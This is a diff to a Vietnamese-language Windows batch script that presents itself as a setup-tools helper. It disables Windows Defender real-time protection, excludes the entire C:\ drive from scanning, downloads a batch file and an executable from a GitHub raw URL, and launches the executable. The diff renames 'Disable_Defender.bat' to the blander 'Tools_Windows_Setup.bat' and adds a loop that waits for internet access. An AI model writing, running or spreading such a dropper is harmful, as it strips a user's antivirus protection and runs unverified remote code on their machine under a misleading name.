@@ -13,6 +13,23 @@ title Tat tam thoi Windows Defender + Tai file GitHub
 color 0A
 
 :: ========================
+:: KIỂM TRA INTERNET TRƯỚC TIÊN
+:: ========================
+:CHECK_INTERNET
+echo Dang kiem tra ket noi Internet...
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+  "$ProgressPreference='SilentlyContinue'; function Test-Url([string]$u){try{(Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 5).StatusCode -lt 400}catch{ $false }}; if( (Test-Url 'https://www.msftconnecttest.com/connecttest.txt') -or (Test-Url 'https://www.google.com/generate_204') ){ exit 0 } else { exit 1 }"
+if %errorlevel%==0 (
+  echo [+] Da co ket noi Internet.
+  echo.
+) else (
+  echo [!] Vui long ket noi Internet. Se tu thu lai sau 30 giay...
+  timeout /t 30 /nobreak >nul
+  echo.
+  goto :CHECK_INTERNET
+)
+
+:: ========================
 :: KIỂM TRA QUYỀN ADMIN
 :: ========================
 net session >nul 2>&1
@@ -22,38 +39,38 @@ powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName S
 exit /b
 
 :ADMIN
-echo ✅ Dang chay voi quyen Admin.
+echo Dang chay voi quyen Admin.
 echo.
 
 :: ========================
 :: TẮT TẠM THỜI DEFENDER
 :: ========================
-echo ⚙️ Dang tat tam thoi Windows Defender Real-Time Protection...
+echo Dang tat tam thoi Windows Defender Real-Time Protection...
 powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}"
 powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath 'C:\' } catch {}"
-echo ➜ Da gui lenh tat tam thoi (neu that bai, van tiep tuc tai file).
+echo Da gui lenh tat tam thoi (neu that bai, van tiep tuc tai file).
 echo.
 
 :: ========================
 :: TẢI FILE TỪ GITHUB (NẾU CHƯA CÓ)
 :: ========================
 set "DESKTOP=%USERPROFILE%\Desktop"
-set "FILE1=%DESKTOP%\Disable_Defender.bat"
+set "FILE1=%DESKTOP%\Tools_Windows_Setup.bat"
 set "FILE2=%DESKTOP%\Tools_Windows_Setup.exe"
-set "URL_BAT=https://raw.githubusercontent.com/ToolsSetupWindows/File/main/Disable_Defender.bat"
+set "URL_BAT=https://raw.githubusercontent.com/ToolsSetupWindows/File/main/Tools_Windows_Setup.bat"
 set "URL_EXE=https://raw.githubusercontent.com/ToolsSetupWindows/File/main/Tools_Windows_Setup.exe"
 
 if exist "%FILE1%" (
-  echo [+] Da ton tai: Disable_Defender.bat
+  echo [+] Da ton tai: Tools_Windows_Setup.bat
 ) else (
-  echo 📥 Dang tai Disable_Defender.bat...
-  powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%URL_BAT%' -OutFile '%FILE1%' -UseBasicParsing"  || echo [-] Loi tai Disable_Defender.bat
+  echo Dang tai Tools_Windows_Setup.bat...
+  powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%URL_BAT%' -OutFile '%FILE1%' -UseBasicParsing"  || echo [-] Loi tai Tools_Windows_Setup.bat
 )
 
 if exist "%FILE2%" (
   echo [+] Da ton tai: Tools_Windows_Setup.exe
 ) else (
-  echo 📥 Dang tai Tools_Windows_Setup.exe...
+  echo Dang tai Tools_Windows_Setup.exe...
   powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%URL_EXE%' -OutFile '%FILE2%' -UseBasicParsing"  || echo [-] Loi tai Tools_Windows_Setup.exe
 )
 echo.
@@ -62,14 +79,15 @@ echo.
 :: KIỂM TRA & MỞ FILE
 :: ========================
 if exist "%FILE1%" (
-  echo [+] San sang: Disable_Defender.bat
+  echo [+] San sang: Tools_Windows_Setup.bat
 ) else (
-  echo [-] Khong tim thay Disable_Defender.bat
+  echo [-] Khong tim thay Tools_Windows_Setup.bat
 )
 
 if exist "%FILE2%" (
   echo [+] San sang: Tools_Windows_Setup.exe
-  echo 🚀 Dang mo Tools_Windows_Setup.exe...
+  echo -------------------------------------
+  echo Dang mo Tools_Windows_Setup.exe...
   start "" "%FILE2%"
 ) else (
   echo [-] Khong tim thay Tools_Windows_Setup.exe
@@ -77,5 +95,5 @@ if exist "%FILE2%" (
 
 echo.
 echo Hoan tat.
-pause
 endlocal
+exit
